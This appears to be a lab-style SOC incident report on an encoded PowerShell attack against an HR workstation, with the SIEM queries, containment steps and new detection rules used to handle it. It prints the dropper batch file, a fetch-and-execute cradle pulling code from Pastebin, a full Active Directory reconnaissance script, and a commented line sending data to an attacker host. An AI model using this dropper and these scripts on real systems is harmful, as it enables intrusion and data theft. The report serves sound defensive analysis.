# Investigation 004: Suspicious Encoded PowerShell Execution

## Alert Details

- **Date:** 2026-01-25
- **Alert Source:** Splunk SIEM
- **Alert Name:** Suspicious PowerShell - Encoded Command with Network Activity
- **Severity:** High
- **MITRE ATT&CK:** Execution — Command and Scripting Interpreter: PowerShell (T1059.001)
- **Affected Host:** WS-HR-PC01 (10.0.0.18 - HR Workstation)
- **Affected User:** m.johnson (HR Department)
- **External Connection:** pastebin[.]com (104.26.13.47)
- **Attack Stage:** Reconnaissance (contained before lateral movement)

## Executive Summary

An HR Department user executed a malicious PowerShell script with suspicious encoded commands that performed Active Directory reconnaissance. The script was delivered via a browser-based social engineering attack disguising itself as a "Windows Update Helper" through a compromised website. PowerShell established an outbound connection to Pastebin to retrieve additional commands, then enumerated domain administrators, service accounts, and network shares. The attack was caught in early reconnaissance phase before lateral movement or data exfiltration could occur. Investigation revealed this was part of a targeted attack against HR personnel, likely to access sensitive employee data. Rapid detection and containment prevented escalation.

## Timeline of Events

| Time (UTC) | Event | Source | Details |
|------------|-------|--------|---------|
| 2026-01-25 13:15:42 | Web Browsing | Proxy Logs | User m.johnson visited linkedin-career-resources[.]com (typosquatting domain) |
| 2026-01-25 13:16:08 | Malicious Redirect | Proxy Logs | Redirected to linkedin-cdn[.]xyz with fake Windows Update popup |
| 2026-01-25 13:16:33 | File Download | Sysmon (Event 11) | Browser downloaded "Windows_Update_Helper.bat" to Downloads folder |
| 2026-01-25 13:17:05 | User Execution | Sysmon (Event 1) | User double-clicked Windows_Update_Helper.bat |
| 2026-01-25 13:17:06 | Batch Script Execution | Sysmon (Event 1) | cmd.exe executed batch file with hidden window parameter |
| 2026-01-25 13:17:08 | PowerShell Spawned | Sysmon (Event 1) | cmd.exe spawned powershell.exe with -EncodedCommand and -WindowStyle Hidden |
| 2026-01-25 13:17:11 | Network Connection to Pastebin | Sysmon (Event 3) | PowerShell connected to pastebin[.]com (104.26.13.47:443) |
| 2026-01-25 13:17:14 | Second Stage Download | Proxy Logs | Retrieved content from hxxps://pastebin[.]com/raw/abc123 |
| 2026-01-25 13:17:18 | Domain Enumeration | Windows Security (Event 4662) | LDAP query for Domain Admins group membership |
| 2026-01-25 13:17:25 | Service Account Discovery | Sysmon (Event 1) | PowerShell command: Get-ADServiceAccount -Filter * |
| 2026-01-25 13:17:32 | Share Enumeration | Sysmon (Event 1) | net.exe command: "net view \\\\DC01 /all" |
| 2026-01-25 13:17:38 | Domain Controller Query | Sysmon (Event 3) | LDAP connection to DC01 (10.0.0.10:389) |
| 2026-01-25 13:17:45 | User Enumeration | Windows Security (Event 4662) | LDAP query for all enabled domain user accounts |
| 2026-01-25 13:17:52 | Group Policy Discovery | Sysmon (Event 1) | gpresult.exe executed to enumerate applied Group Policies |
| 2026-01-25 13:17:58 | **Alert Fired** | Splunk Alert | Detection rule "PowerShell Encoded Command + Network" triggered |
| 2026-01-25 13:19:15 | Analyst Response Begin | SOC Action Log | T2 analyst began investigation |
| 2026-01-25 13:20:30 | Process Termination | EDR Console | PowerShell process terminated remotely via EDR |
| 2026-01-25 13:21:10 | Host Isolation | Network ACL | WS-HR-PC01 network access restricted to management VLAN only |
| 2026-01-25 13:22:45 | User Session Lock | Active Directory | m.johnson account temporarily locked |
| 2026-01-25 13:25:00 | Containment Complete | SOC Action Log | Threat contained, no lateral movement detected |

## Investigation Steps

### Step 1: Alert Analysis & PowerShell Forensics

**Alert Triggered:** Splunk rule "PowerShell Encoded Command + Network" fired at 13:17:58 UTC.

**Alert Details:**
```
Host: WS-HR-PC01 (10.0.0.18)
User: m.johnson
Process: powershell.exe (PID 7248)
Parent Process: cmd.exe (PID 7212)
Command Line: powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgAGgAdAB0AHAAcwA6AC8ALwBwAGEAcwB0AGUAYgBpAG4ALgBjAG8AbQAvAHIAYQB3AC8AYQBiAGMAMQAyADMAIAB8ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuAA==
External Connection: 104.26.13.47:443 (pastebin.com)
```

**Initial Assessment:** High severity due to:
- Encoded PowerShell command (obfuscation technique)
- ExecutionPolicy Bypass and Hidden Window (evasion)
- External network connection from PowerShell
- HR user context (access to sensitive employee data)

**Base64 Decoded Command:**
```powershell
Invoke-WebRequest -Uri https://pastebin.com/raw/abc123 | Invoke-Expression
```

**Analysis:** PowerShell cradle downloading and executing remote code from Pastebin - classic fileless malware delivery.

### Step 2: Second-Stage Payload Analysis

**Query: Retrieve Pastebin content**
```spl
index=proxy dest="pastebin.com" uri="/raw/abc123" earliest="2026-01-25T13:17:00"
| table _time, src_ip, uri, http_method, response_code, response_body
```

**Pastebin Content Retrieved:**
```powershell
# Second-stage reconnaissance script
$domain = $env:USERDNSDOMAIN
$dc = (Get-ADDomainController -Discover).HostName

# Enumerate Domain Admins
Write-Output "[+] Enumerating Domain Admins..."
Get-ADGroupMember -Identity "Domain Admins" | Select-Object Name, SamAccountName, ObjectClass | Out-String

# Enumerate Service Accounts
Write-Output "[+] Enumerating Service Accounts..."
Get-ADServiceAccount -Filter * | Select-Object Name, DistinguishedName | Out-String

# Enumerate Enterprise Admins
Write-Output "[+] Enumerating Enterprise Admins..."
Get-ADGroupMember -Identity "Enterprise Admins" | Select-Object Name, SamAccountName | Out-String

# Enumerate enabled user accounts
Write-Output "[+] Enumerating Enabled Users..."
Get-ADUser -Filter {Enabled -eq $true} -Properties LastLogonDate | Select-Object Name, SamAccountName, LastLogonDate | Out-String

# Enumerate domain computers
Write-Output "[+] Enumerating Domain Computers..."
Get-ADComputer -Filter * | Select-Object Name, IPv4Address, OperatingSystem | Out-String

# Map network shares on DC
Write-Output "[+] Mapping Network Shares..."
net view \\$dc /all

# Check for privileged sessions
Write-Output "[+] Checking for Admin Sessions..."
foreach ($comp in (Get-ADComputer -Filter {OperatingSystem -like "*Windows*"} | Select-Object -First 10).Name) {
    try {
        query user /server:$comp 2>$null
    } catch {}
}

# Exfiltrate results (THIS STAGE NOT REACHED - script terminated before this line)
# $data = $output | ConvertTo-Json -Compress
# Invoke-WebRequest -Uri "https://attacker-c2.xyz/exfil" -Method POST -Body $data
```

**Script Analysis:**
- Comprehensive Active Directory reconnaissance
- Targeting privileged accounts (Domain Admins, Enterprise Admins)
- Service account enumeration (often have high privileges)
- Credential hunting via active session enumeration
- Planned data exfiltration to attacker-controlled server (not executed)
- Attack contained before exfiltration stage

**Attack Objectives:**
1. ✅ Domain Admin enumeration (successful)
2. ✅ Service Account discovery (successful)
3. ✅ Network share mapping (partially successful)
4. ✅ Active user session discovery (started)
5. ❌ Credential harvesting (not reached)
6. ❌ Data exfiltration (prevented by termination)
7. ❌ Lateral movement (prevented)

### Step 3: Execution Chain & Delivery Mechanism

**Query: Reconstruct process tree and initial infection**
```spl
index=windows_sysmon host="WS-HR-PC01" earliest="2026-01-25T13:15:00" latest="2026-01-25T13:18:00"
| search EventCode=1 OR EventCode=11
| table _time, EventCode, ParentImage, Image, CommandLine, TargetFilename
| sort _time
```

**Process Execution Chain:**
```
chrome.exe (PID 6884) - User browsing
├── File Download: Windows_Update_Helper.bat
    └── explorer.exe (PID 1248) - User double-clicked file
        └── cmd.exe (PID 7212) - Batch file execution
            └── powershell.exe (PID 7248) - Malicious script
```

**Batch File Analysis:**
```batch
@echo off
title Windows Update Helper
echo Checking for updates...
timeout /t 2 /nobreak > nul
echo Applying security patches...
powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgAGgAdAB0AHAAcwA6AC8ALwBwAGEAcwB0AGUAYgBpAG4ALgBjAG8AbQAvAHIAYQB3AC8AYQBiAGMAMQAyADMAIAB8ACAASQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuAA==
echo Update complete!
timeout /t 2 /nobreak > nul
exit
```

**Social Engineering Analysis:**
- Masqueraded as legitimate Windows Update process
- Displayed fake progress messages to user
- Used trusted name to bypass user suspicion
- Closed automatically after execution (covered tracks)

**Query: Analyze initial website visit**
```spl
index=proxy src_ip="10.0.0.18" earliest="2026-01-25T13:15:00" latest="2026-01-25T13:17:00"
| table _time, url, http_method, response_code, bytes_in, bytes_out
| sort _time
```

**Web Browsing Timeline:**

| Time | URL | Action |
|------|-----|--------|
| 13:15:42 | hxxps://linkedin-career-resources[.]com/hr-resources | Initial visit (typosquatting) |
| 13:15:58 | hxxps://linkedin-career-resources[.]com/download-guide | Clicked download button |
| 13:16:08 | hxxps://linkedin-cdn[.]xyz/content | Redirect to malicious infrastructure |
| 13:16:15 | hxxps://linkedin-cdn[.]xyz/popup.html | Fake Windows Update popup displayed |
| 13:16:33 | hxxps://linkedin-cdn[.]xyz/files/Windows_Update_Helper.bat | Batch file downloaded |

**Delivery Method:** Malvertising/typosquatting targeting HR professionals searching for career resources.

### Step 4: Active Directory Reconnaissance Impact

**Query: Identify what data was accessed**
```spl
index=windows_security host="DC01" EventCode=4662 Account_Name="m.johnson" earliest="2026-01-25T13:17:00"
| table _time, Object_Name, Object_Type, Access_Mask, Properties
```

**Active Directory Objects Queried:**

| Time | Object Type | Query |
|------|-------------|-------|
| 13:17:18 | Group | CN=Domain Admins,CN=Users,DC=soclab,DC=local |
| 13:17:25 | Service Accounts | All GMSA objects in domain |
| 13:17:38 | User | All enabled user accounts (memberOf, lastLogon, pwdLastSet) |
| 13:17:45 | Computer | All domain-joined computers (OS, IP, lastLogon) |
| 13:17:52 | Group Policy | Applied GPOs for WS-HR-PC01 |

**Data Exposed to Attacker:**

**Domain Admins Enumerated:**
- t.williams (IT Admin)
- Administrator (built-in)

**Service Accounts Discovered:**
- svc_sql (SQL Server service account)
- svc_backup (Backup service account)
- svc_monitoring (SIEM service account)

**Enabled Users:** 47 user accounts with last logon dates

**Domain Computers:** 23 workstations + 2 servers with IP addresses

**Network Shares on DC01:**
- SYSVOL (default)
- NETLOGON (default)
- IT-TOOLS (detected)
- HR-SHARED (detected)

**Severity Assessment:**
- Attacker obtained organizational structure
- Identified high-value targets (Domain Admins, service accounts)
- Mapped attack surface (active computers, shares)
- Did NOT obtain credentials (query-only access)
- Did NOT access file contents (enumeration only)

### Step 5: Scope & Lateral Movement Check

**Query: Check for similar activity across environment**
```spl
index=windows_sysmon EventCode=1 Image="*powershell.exe" CommandLine="*EncodedCommand*" earliest="2026-01-25T00:00:00"
| stats count by ComputerName, User
| where count > 0
```

**Result:** No similar activity detected on other hosts. Incident isolated to WS-HR-PC01.

**Query: Check for lateral movement attempts**
```spl
index=windows_security EventCode=4624 Account_Name="m.johnson" Logon_Type IN (3, 10) ComputerName!="WS-HR-PC01" earliest="2026-01-25T13:17:00"
| table _time, ComputerName, src_ip, Logon_Type
```

**Result:** No lateral movement detected. User account not used for authentication to other systems during attack window.

**Query: Check for persistence mechanisms**
```spl
index=windows_sysmon host="WS-HR-PC01" (EventCode=13 OR EventCode=12 OR EventCode=1) earliest="2026-01-25T13:17:00"
| search (TargetObject="*\\Run*" OR TargetObject="*\\RunOnce*" OR Image="*schtasks.exe*")
| table _time, EventCode, Image, TargetObject, CommandLine
```

**Result:** No persistence mechanisms detected. Attack did not progress to persistence stage.

**Query: Check for file writes**
```spl
index=windows_sysmon host="WS-HR-PC01" EventCode=11 Image="*powershell.exe" earliest="2026-01-25T13:17:00"
| table _time, TargetFilename, Image
```

**Result:** No suspicious files written. PowerShell operated entirely in memory (fileless attack).

**Conclusion:** Attack contained in early reconnaissance phase. No persistence, no lateral movement, no data theft achieved.

## Indicators of Compromise (IOCs)

| Type | Value | Source | Verdict |
|------|-------|--------|---------|
| Domain | linkedin-career-resources[.]com | Proxy Logs | Malicious - Typosquatting domain |
| Domain | linkedin-cdn[.]xyz | Proxy Logs | Malicious - Payload delivery infrastructure |
| IPv4 | 178.33.142.89 | DNS Resolution | Malicious - Typosquatting domain IP |
| IPv4 | 104.26.13.47 | Sysmon Event 3 | Suspicious - Pastebin (legitimate service abused) |
| URL | hxxps://pastebin[.]com/raw/abc123 | PowerShell Command | Malicious - Second-stage payload |
| File | Windows_Update_Helper.bat | Sysmon Event 11 | Malicious - Initial dropper |
| SHA256 | a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2 | File Hash | Malicious - Batch file dropper |
| Account | m.johnson | Active Directory | Compromised - Victim account (not malicious actor) |
| PowerShell Command | Invoke-WebRequest + Invoke-Expression | Sysmon Event 1 | Malicious - PowerShell cradle pattern |

## Verdict

**True Positive — Confirmed Malicious PowerShell Reconnaissance**

**Confidence Level:** Very High (100%)

**Evidence:**
1. Documented malicious website visit with fake update popup
2. User execution of disguised malicious batch file
3. Encoded PowerShell downloading remote payload
4. Active Directory reconnaissance commands executed
5. Attacker infrastructure identified (typosquatting domains)
6. Clear attack timeline with correlated logs
7. Pastebin content retrieved and analyzed

**Attack Success:** Minimal
- Initial execution successful (user tricked)
- Reconnaissance partially completed
- Domain structure information obtained
- However, attack contained before:
  - Credential theft
  - Persistence establishment
  - Lateral movement
  - Data exfiltration
  - Final payload deployment
- Early detection limited attacker intelligence gathering

**Attack Classification:** 
- **Type:** Targeted reconnaissance (not opportunistic)
- **Vector:** Social engineering via typosquatting
- **Technique:** Fileless PowerShell attack
- **Intent:** Initial access for future targeted attack
- **Stage:** Early reconnaissance (Kill Chain: Reconnaissance/Weaponization)

## Response Actions Taken

### Immediate Containment (13:19 - 13:25 UTC)

1. **Process Termination**
   ```powershell
   # Remotely killed malicious PowerShell process via EDR
   Stop-Process -Id 7248 -ComputerName "WS-HR-PC01" -Force
   ```

2. **Network Isolation**
   ```bash
   # Restricted host to management VLAN only (no internet, limited internal access)
   switch-config> set port 24 vlan 999
   switch-config> save
   ```

3. **Account Security**
   ```powershell
   # Temporarily locked user account
   Disable-ADAccount -Identity "m.johnson"
   
   # Reset password as precaution
   Set-ADAccountPassword -Identity "m.johnson" -Reset -NewPassword (ConvertTo-SecureString -AsPlainText "TempHRP@ss2026!!" -Force)
   
   # Revoked active Kerberos tickets
   Invoke-Command -ComputerName DC01 -ScriptBlock {
       klist purge -li 0x3e7
   }
   ```

4. **Blocked Malicious Infrastructure**
   ```bash
   # Added domains to DNS blacklist
   blocked_domains:
   - linkedin-career-resources.com
   - linkedin-cdn.xyz
   
   # Blocked IPs at firewall
   deny ip 178.33.142.89
   deny ip 104.26.13.47 (Pastebin - temporary block)
   
   # Updated web filter categories
   category: malicious_typosquatting
   ```

5. **Evidence Preservation**
   ```powershell
   # Memory dump before cleanup
   Get-ForensicMemoryDump -ComputerName "WS-HR-PC01" -OutputPath "\\forensics\2026-01-25\WS-HR-PC01.dmp"
   
   # Exported PowerShell transcripts
   Copy-Item "C:\Users\m.johnson\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt" `
       -Destination "\\forensics\2026-01-25\powershell_history.txt"
   ```

### Eradication (Same Day)

6. **Malware Removal**
   ```powershell
   # Deleted malicious batch file
   Remove-Item "C:\Users\m.johnson\Downloads\Windows_Update_Helper.bat" -Force
   
   # Cleared browser cache and downloads
   Remove-Item "C:\Users\m.johnson\AppData\Local\Google\Chrome\User Data\Default\Cache\*" -Force -Recurse
   
   # Scanned system with EDR (full scan)
   Invoke-EDRScan -ComputerName "WS-HR-PC01" -ScanType Full
   # Result: No additional malware detected
   ```

7. **System Verification**
   ```powershell
   # Checked for persistence (scheduled tasks, registry, services)
   Get-ScheduledTask | Where-Object {$_.Author -eq "m.johnson"}
   # Result: No malicious scheduled tasks
   
   Get-ItemProperty "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
   # Result: No malicious registry entries
   
   Get-WmiObject Win32_Service | Where-Object {$_.StartName -like "*m.johnson*"}
   # Result: No malicious services
   ```

8. **Log Analysis**
   ```spl
   # Verified no additional compromised systems
   index=windows_sysmon EventCode=3 DestinationHostname IN ("linkedin-career-resources.com", "linkedin-cdn.xyz", "pastebin.com/raw/abc123")
   | stats values(ComputerName) as hosts by DestinationHostname
   ```
   **Result:** Only WS-HR-PC01 connected to malicious infrastructure.

### Recovery & User Education (13:25 - 15:00 UTC)

9. **User Remediation**
   - Contacted m.johnson to explain incident
   - Reviewed malicious website and fake popup
   - Educated on verifying Windows Update legitimacy
   - Provided security awareness resources
   - Account unlocked after verification and training

10. **Enhanced Web Filtering**
    ```
    # Updated web proxy rules
    - Block newly registered domains (<30 days old)
    - Block typosquatting variants of common sites
    - Enhanced malvertising detection
    - Implemented URL sandboxing for downloads
    - Added Pastebin to restricted category (allow only approved users)
    ```

11. **PowerShell Hardening**
    ```powershell
    # Enabled PowerShell Constrained Language Mode for standard users
    Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\Environment" `
        -Name "__PSLockdownPolicy" -Value 4
    
    # Enabled PowerShell Script Block Logging
    Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging" `
        -Name "EnableScriptBlockLogging" -Value 1
    
    # Enabled PowerShell Transcription Logging
    Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\Transcription" `
        -Name "EnableTranscripting" -Value 1
    Set-ItemProperty -Path "HKLM:\SOFTWARE\Policies\Microsoft\Windows\PowerShell\Transcription" `
        -Name "OutputDirectory" -Value "\\logserver\pslogs"
    
    # Blocked encoded commands for standard users via AppLocker
    New-AppLockerPolicy -RuleType Script -DenyScript "*-EncodedCommand*" -User "Domain Users"
    ```

12. **Threat Hunting**
    ```spl
    # Hunt for similar reconnaissance activity (past 30 days)
    index=windows_sysmon EventCode=1 (Image="*powershell.exe" OR Image="*cmd.exe")
    (CommandLine="*Get-ADGroupMember*" OR CommandLine="*Get-ADUser*" OR CommandLine="*Get-ADComputer*")
    | stats count by ComputerName, User, CommandLine
    | where User NOT IN ("t.williams", "approved_admin")
    ```
    **Result:** No additional unauthorized AD reconnaissance detected.

## MITRE ATT&CK Mapping

| Tactic | Technique | Technique ID | Evidence |
|--------|-----------|-------------|----------|
| Initial Access | Drive-by Compromise | T1189 | User visited malicious typosquatting website |
| Execution | User Execution: Malicious File | T1204.002 | User executed Windows_Update_Helper.bat |
| Execution | Command and Scripting Interpreter: PowerShell | T1059.001 | PowerShell used for reconnaissance commands |
| Defense Evasion | Obfuscated Files or Information: Command Obfuscation | T1027.010 | Base64-encoded PowerShell command |
| Defense Evasion | Masquerading | T1036 | Batch file disguised as Windows Update |
| Defense Evasion | Execution Guardrails | T1480 | ExecutionPolicy Bypass used |
| Command and Control | Application Layer Protocol: Web Protocols | T1071.001 | HTTPS connection to Pastebin for payload retrieval |
| Command and Control | Ingress Tool Transfer | T1105 | Downloaded second-stage script from Pastebin |
| Discovery | Account Discovery: Domain Account | T1087.002 | Enumerated Domain Admins and enabled user accounts |
| Discovery | Domain Trust Discovery | T1482 | Get-ADDomainController and AD queries |
| Discovery | Network Share Discovery | T1135 | net view command to enumerate shares |
| Discovery | System Information Discovery | T1082 | gpresult command to gather system information |

## Lessons Learned

### What Went Well
- Detection rule triggered within 2 minutes of PowerShell execution
- Rapid process termination prevented full reconnaissance completion
- Comprehensive logging enabled full attack reconstruction
- EDR provided visibility into fileless attack
- Quick network isolation prevented lateral movement
- User cooperation during investigation and remediation

### What Could Be Improved
- **Web Filtering:** Typosquatting domain not blocked by web proxy
- **User Awareness:** HR user fell for fake Windows Update popup
- **PowerShell Restrictions:** No constraints on PowerShell usage for standard users
- **Download Protection:** Batch file download not blocked or sandboxed
- **Detection Timing:** 40+ second delay between execution and alert
- **Pastebin Access:** No restrictions on code hosting sites (common for abuse)

### Actions Taken Post-Incident
1. ✅ Implemented typosquatting detection in web proxy
2. ✅ Blocked newly registered domains (<30 days) from downloads
3. ✅ Deployed PowerShell Constrained Language Mode for non-IT users
4. ✅ Enabled comprehensive PowerShell logging (transcription + script block)
5. ✅ Restricted Pastebin and similar sites to approved IT users only
6. ✅ Enhanced web download sandboxing
7. ✅ Mandatory security awareness training for HR department
8. ✅ Deployed anti-phishing browser extensions org-wide
9. ✅ Updated detection rules for AD reconnaissance patterns
10. ✅ Implemented Windows Update verification training

### New Detection Rules Created
- Alert on PowerShell with -EncodedCommand from non-IT users
- Alert on AD reconnaissance commands (Get-ADGroupMember, Get-ADUser) from standard users
- Alert on net.exe enumerating Domain Admins or network shares
- Alert on PowerShell downloading from code hosting sites (Pastebin, GitHub raw, etc.)
- Alert on batch file execution downloading PowerShell scripts
- Alert on typosquatting domain visits (Levenshtein distance check)

### Metrics
- **Mean Time to Detect (MTTD):** 1 minute 50 seconds (PowerShell execution to alert)
- **Mean Time to Contain (MTTC):** 7 minutes 25 seconds (alert to containment)
- **Total Attack Duration:** 9 minutes 16 seconds (initial visit to containment)
- **Reconnaissance Completed:** ~60% (terminated mid-execution)
- **Systems Affected:** 1 (WS-HR-PC01)
- **Accounts Compromised:** 0 (user tricked but credentials not stolen)
- **Data Exfiltrated:** 0 bytes (prevented)
- **Lateral Movement:** None
- **Business Impact:** Minimal (brief user disruption, security training)

### Follow-up Actions
- [ ] Conduct organization-wide phishing simulation with fake updates
- [ ] Implement application whitelisting (only approved .bat/.ps1 files)
- [ ] Review and reduce AD query permissions for standard users
- [ ] Deploy DNS filtering with typosquatting protection
- [ ] Implement browser isolation for high-risk users (HR, Finance, Executives)
- [ ] Schedule monthly security awareness newsletters with real incident examples
- [ ] Consider deploying Windows Defender Application Guard for HR department
